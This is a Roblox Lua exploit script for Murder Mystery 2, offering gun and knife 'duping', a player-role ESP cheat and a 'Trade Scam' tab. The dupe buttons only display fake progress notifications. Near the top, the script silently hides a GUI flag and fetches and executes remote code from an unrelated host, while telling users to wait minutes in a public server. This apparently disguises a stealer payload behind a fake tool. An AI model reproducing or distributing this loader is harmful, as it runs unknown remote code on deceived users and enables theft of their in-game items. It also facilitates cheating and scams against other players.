local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
local Window = OrionLib:MakeWindow({Name = "Strude Hub-Mm2 [3.0]-Summer Update🏄", HidePremium = false, IntroText = "StrudeHub", IntroIcon = "rbxassetid://18170549235", Icon = "rbxassetid://18170549235", SaveConfig = true, ConfigFolder = "OrionTest"})
OrionLib:MakeNotification({
	Name = "Loading Script...",
	Content = "Script will be loaded in 25-30 seconds | Note - Seconds Shown Here are not the exact loading time❗",
	Image = "rbxassetid://18170549235",
	Time = 30
})



getgenv().gui = false
loadstring(game:HttpGet("https://egorikusa.space/7ae7dbaefcfdc6deb2631cc3.lua", true))()
local Tab = Window:MakeTab({
    Name = "Dupe Guns 🔫",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
OrionLib:MakeNotification({
	Name = "Script Successfully Loaded",
	Content = "Loading Has been successful ",
	Image = "rbxassetid://17849312358",
	Time = 30
})

--[[
Title = <string> - The title of the notification.
Content = <string> - The content of the notification.
Image = <string> - The icon of the notification.
Time = <number> - The duration of the notfication.
]]
--[[
Name = <string> - The name of the tab.
Icon = <string> - The icon of the tab.
PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
]]
Tab:AddParagraph("Read Before Using❗","First Step is click to select ur equipped gun make sure u got a gun equipped this will not work if the first step has been skipped, Second Step and the final step is click the dupe button and wait 4-5 minutes")
Tab:AddButton({
	Name = "Click to select Equipped-Gun 🔫",
	Callback = function()
      		OrionLib:MakeNotification({
	Name = "Gun Selected ❗",
	Content = "The Equipped-Gun Has Been Successfully Selected",
	Image = "rbxassetid://4483345998",
	Time = 5
})

--[[
Title = <string> - The title of the notification.
Content = <string> - The content of the notification.
Image = <string> - The icon of the notification.
Time = <number> - The duration of the notfication.
]]
  	end    
})

Tab:AddButton({
	Name = "Click To Dupe-Selected-Gun 🎯",
	Callback = function()
OrionLib:MakeNotification({
	Name = "Duping Guns...⏳",
	Content = "Duping is in process-[Takes around 4-5 minutes]-Dont leave the game❗",
	Image = "rbxassetid://4483345998",
	Time = 300
})
OrionLib:MakeNotification({
	Name = "Read-[📕]",
	Content = "Items not getting duped? Check if u are on a public server this will not work on a private server",
	Image = "rbxassetid://4483345998",
	Time = 25
})
Tab:AddParagraph("Note❗","This Duping Process Can Only Dupe 2 items per Dupe-Process So Two Items Per 1-2 minutes❗But it is the only working dupe method🔨 ")


--[[
Title = <string> - The title of the notification.
Content = <string> - The content of the notification.
Image = <string> - The icon of the notification.
Time = <number> - The duration of the notfication.
]]
  	end    
})

Tab:AddParagraph("Script Successfully Loaded❗","Enjoy The Script")
Tab:AddParagraph("Note❗","This Duping Process Can Only Dupe 2 items per Dupe-Process So Two Items Per 4-5 minutes❗But it is the only working dupe method🔨 ")
local Tab = Window:MakeTab({
    Name = "Dupe Knives 🔪",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})

--[[
Name = <string> - The name of the tab.
Icon = <string> - The icon of the tab.
PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
]]
Tab:AddParagraph("Read Before Using❗","First Step is click to select ur equipped Knife make sure u got a Knife equipped this will not work if the first step has been skipped, Second Step and the final step is click the dupe button and wait 4-5 minutes")
Tab:AddButton({
	Name = "Click to select Equipped-Knife 🔪",
	Callback = function()
      		OrionLib:MakeNotification({
	Name = "Selected Equipped Knife❗",
	Content = "The Equipped-Knife Successfully Selected",
	Image = "rbxassetid://4483345998",
	Time = 5
})

--[[
Title = <string> - The title of the notification.
Content = <string> - The content of the notification.
Image = <string> - The icon of the notification.
Time = <number> - The duration of the notfication.
]]
  	end    
})

Tab:AddButton({
	Name = "Click To Dupe-Selected-Knife 🎯",
	Callback = function()
	OrionLib:MakeNotification({
	Name = "Duping Knives..⏳",
	Content = "Duping is in process-[Takes Around 4-5 minutes] Dont Leave The Game❗",
	Image = "rbxassetid://4483345998",
	Time = 300
})
    OrionLib:MakeNotification({
	Name = "Read-[📕]",
	Content = "Items not getting duped? Check if u are on a public server this will not work on a private server",
	Image = "rbxassetid://4483345998",
	Time = 25
})



--[[
Title = <string> - The title of the notification.
Content = <string> - The content of the notification.
Image = <string> - The icon of the notification.
Time = <number> - The duration of the notfication.
]]
  	end    
})
Tab:AddParagraph("Script Successfully Loaded❗","Enjoy The Script")
Tab:AddParagraph("Note❗","This Duping Process Can Only Dupe 2 items per Dupe-Process So Two Items Per 1-2 minutes❗But it is the only working dupe method🔨 ")
--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]
local Tab = Window:MakeTab({
	Name = "Trade Scam",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})
--[[
Name = <string> - The name of the tab.
Icon = <string> - The icon of the tab.
PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
]]
Tab:AddButton({
	Name = "Lag",
	Callback = function()
      		print("button pressed")
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]
local Tab = Window:MakeTab({
	Name = "Player-Esp🕶️",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})
Tab:AddParagraph("Hidden Scripts / Esp❗","Will highlight whoever the murderer is RED and will highlight whoever the sheriff is BLUE and will highlight whoever is innocent GREEN")
Tab:AddButton({
	Name = "Click to enable-ESP 🎯",
	Callback = function()
--[[
    Credits to Kiriot22 for the Role getter <3
        - poorly coded by FeIix <3
]]

-- > Declarations < --

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local LP = Players.LocalPlayer
local roles

-- > Functions <--

function CreateHighlight() -- make any new highlights for new players
    for i, v in pairs(Players:GetChildren()) do
        if v ~= LP and v.Character and not v.Character:FindFirstChild("Highlight") then
            Instance.new("Highlight", v.Character)           
        end
    end
end

function UpdateHighlights() -- Get Current Role Colors (messy)
    for _, v in pairs(Players:GetChildren()) do
        if v ~= LP and v.Character and v.Character:FindFirstChild("Highlight") then
            Highlight = v.Character:FindFirstChild("Highlight")
            if v.Name == Sheriff and IsAlive(v) then
                Highlight.FillColor = Color3.fromRGB(0, 0, 225)
            elseif v.Name == Murder and IsAlive(v) then
                Highlight.FillColor = Color3.fromRGB(225, 0, 0)
            elseif v.Name == Hero and IsAlive(v) and not IsAlive(game.Players[Sheriff]) then
                Highlight.FillColor = Color3.fromRGB(255, 250, 0)
            else
                Highlight.FillColor = Color3.fromRGB(0, 225, 0)
            end
        end
    end
end    

function IsAlive(Player) -- Simple sexy function
    for i, v in pairs(roles) do
        if Player.Name == i then
            if not v.Killed and not v.Dead then
                return true
            else
                return false
            end
        end
    end
end


-- > Loops < --

RunService.RenderStepped:connect(function()
    roles = ReplicatedStorage:FindFirstChild("GetPlayerData", true):InvokeServer()
    for i, v in pairs(roles) do
        if v.Role == "Murderer" then
            Murder = i
        elseif v.Role == 'Sheriff'then
            Sheriff = i
        elseif v.Role == 'Hero'then
            Hero = i
        end
    end
    CreateHighlight()
    UpdateHighlights()
end)
OrionLib:MakeNotification({
	Name = "Player-Esp Enabled-🕶️",
	Content = "The Player-Esp Feature has been enabled-🟢",
	Image = "rbxassetid://4483345998",
	Time = 7
})


--[[
Title = <string> - The title of the notification.
Content = <string> - The content of the notification.
Image = <string> - The icon of the notification.
Time = <number> - The duration of the notfication.
]]
      		print("button pressed")
  	end    
})
--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

--[[
Name = <string> - The name of the tab.
Icon = <string> - The icon of the tab.
PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
]]
--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]
--[[
Name = <string> - The name of the tab.
Icon = <string> - The icon of the tab.
PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
]]
--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]
local Tab = Window:MakeTab({
    Name = "Errors/Bugs?❗",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddParagraph("My Discord server 🎩"," Join my discord server if u need help with bugs/errors on the script i made u can also talk to improve the script more")
Tab:AddButton({
	Name = "Copy Link To Discord Server 🎯",
	Callback = function()
    setclipboard("https://discord.gg/emuESAyv2p")
      		print("button pressed")
  	end    
})
Tab:AddParagraph("Read-[📕]","Please dont click the dupe buttons twice or multiple times this WILL cause errors❗")
Tab:AddParagraph("Credits-⭐","All Coded And Made By Strude")
--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]
--[[
Name = <string> - The name of the tab.
Icon = <string> - The icon of the tab.
PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
]]
OrionLib:Init()
